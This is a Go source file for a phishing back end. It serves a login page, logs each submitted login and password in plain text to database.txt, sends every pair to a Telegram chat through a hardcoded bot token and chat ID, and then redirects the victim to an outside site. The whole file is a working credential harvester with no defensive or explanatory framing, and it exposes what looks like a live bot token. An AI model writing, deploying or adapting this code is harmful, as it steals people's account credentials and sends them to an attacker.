package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
)

const (
	telegramBotToken = "8634736702:AAGOcdcMjydVUDwk3bmYDS4exqeMf_lFv84"
	telegramChatID   = "8892440943"
)

func sendToChat(login, password string) {
	if telegramBotToken == "YOUR_BOT_TOKEN" || telegramChatID == "YOUR_CHAT_ID" {
		return
	}
	msg := fmt.Sprintf("New login: %s, password: %s", login, password)
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
	payload := map[string]interface{}{
		"chat_id": telegramChatID,
		"text":    msg,
	}
	jsonData, _ := json.Marshal(payload)
	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := r.ParseForm(); err != nil {
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		return
	}
	login := r.FormValue("login")
	password := r.FormValue("password")

	file, err := os.OpenFile("database.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Failed to open file: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	defer file.Close()
	_, err = fmt.Fprintf(file, "\n%s:%s\n", login, password)
	if err != nil {
		log.Printf("Failed to write to file: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}

	sendToChat(login, password)

	http.Redirect(w, r, "http://lleo.aha.ru/na/", http.StatusFound)
}

func main() {
	http.Handle("/assets/", http.StripPrefix("/assets/", http.FileServer(http.Dir("assets"))))

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/" {
			http.ServeFile(w, r, "index.html")
			return
		}
		http.NotFound(w, r)
	})

	http.HandleFunc("/login", loginHandler)

	port := "8080"
	log.Printf("Server starting on http://localhost:%s", port)
	if err := http.ListenAndServe(":"+port, nil); err != nil {
		log.Fatal(err)
	}
}